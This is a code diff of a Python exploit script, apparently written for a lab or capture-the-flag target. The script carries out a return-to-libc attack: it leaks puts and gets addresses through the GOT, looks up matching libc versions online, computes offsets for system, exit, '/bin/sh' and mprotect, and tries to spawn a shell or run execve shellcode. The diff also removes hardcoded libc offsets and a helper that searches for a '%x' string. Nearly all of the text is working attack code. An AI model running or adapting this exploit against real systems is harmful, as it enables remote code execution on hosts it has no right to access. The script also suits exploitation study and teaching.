@@ -104,18 +104,6 @@ def leakViaPuts(conn, port,putOutAddr, msg="puts"):
     log.success("Leaked address of "+msg+": "+hex(putsAddr))
     return putsAddr
 
-# WSL Ubuntu libc6_2.35-0ubuntu3.6_i386 offsets
-#  putsOffset = 0x732a0
-#  systemOffset = 0x48170
-#  exitOffset = 0x3a460
-#  binShOffset = 0x1bd0d5
-
-# AppSRV libc6_2.23-0ubuntu11.3_i386 offsets
-#  putsOffset = 0x5fcb0
-#  systemOffset = 0x3adb0
-#  exitOffset = 0x3adb0
-#  binShOffset = 0x15bb2b
-
 # Perform a return-to-libc attack executing system('/bin/sh')
 def attemptR2Libc(putsOffset, systemOffset, exitOffset, binShOffset):
     # Leak randomised libc puts addr
@@ -156,7 +144,7 @@ def attemptR2Libc(putsOffset, systemOffset, exitOffset, binShOffset):
 
 
 # Perform a return-to-libc attack executing system('/bin/sh')
-def attemptR2Libc_shellcode(putsOffset, mprotectOff, printfOff, percpOff):
+def attemptR2Libc_shellcode(putsOffset, mprotectOff, printfOff):
     # Leak randomised libc puts addr
     putsAddr = leakViaPuts(conn, port, gotPuts)
 
@@ -335,18 +323,6 @@ def getLibcSymbolOffsets(libcJson):
     log.info(f"Offsets - puts: {putsOff}, system: {systemOff}, str_bin_sh: {bin_shOff}, exit: {exitOff}, mprotect: {mprotectOff}, printf: {printfOff}")
     return putsOff, systemOff, exitOff, bin_shOff, mprotectOff, printfOff
 
-# Find the offset of the string '%x' from the current libc json
-def getPercXOff(libcJson):
-    # Find the url to download the library binary
-    libcUrl = libcJson['download_url']
-    # Get the library binary bytes
-    response = requests.get(libcUrl, headers=headers2)
-    filebytes = response.content
-    # Find and return the offset in the binary of '%x'
-    offset = filebytes.find(b"%x\x00")
-    log.success("%x offset in "+libcJson['id']+": "+hex(offset))
-    return offset
-
 # String to boolean converter is a modified version of: https://stackoverflow.com/a/43357954 (Maxim & dennlinger, 2021)
 def str2bool(v, argname):
     if isinstance(v, bool):
@@ -358,7 +334,6 @@ def str2bool(v, argname):
     else:
         print("\nInvalid boolean value for "+ argname+"\n", file=sys.stderr)
 
-# Only executed if ran directly
 if __name__ == "__main__":
     buffSize = 132
     
@@ -373,22 +348,17 @@ if __name__ == "__main__":
     getsAddr = leakViaPuts(conn,port,gotGets,msg="gets")
     responseJson = findPotentialLibcs(putsAddr,getsAddr)
 
-    percXOff = 0
     # Attempt to execute system('/bin/sh') using ret-to-libc on each potential libc version
     for item in responseJson:
         # Get the symbol offsets for the specific libc version
         putsOff, systemOff, exitOff, bin_shOff, mprotectOff, printfOff = getLibcSymbolOffsets(item)
-
-        # Find the offset of '%x\x00' in libc to use in format string stack leaks (not needed if using only libc leak)
-        if writeToStack:
-            percXOff = getPercXOff(item)
 
         if not useShellcode:
             # Attempt to execute system('/bin/sh')
             retVal = attemptR2Libc(int(putsOff,16),int(systemOff,16),int(exitOff,16),int(bin_shOff,16))
         else:
             # Attempt to execute execve(/bin/sh) shellcode
-            retVal = attemptR2Libc_shellcode(int(putsOff,16),int(mprotectOff,16),int(printfOff,16),percXOff)
+            retVal = attemptR2Libc_shellcode(int(putsOff,16),int(mprotectOff,16),int(printfOff,16))
 
 
         # Print exit message depending on the return value
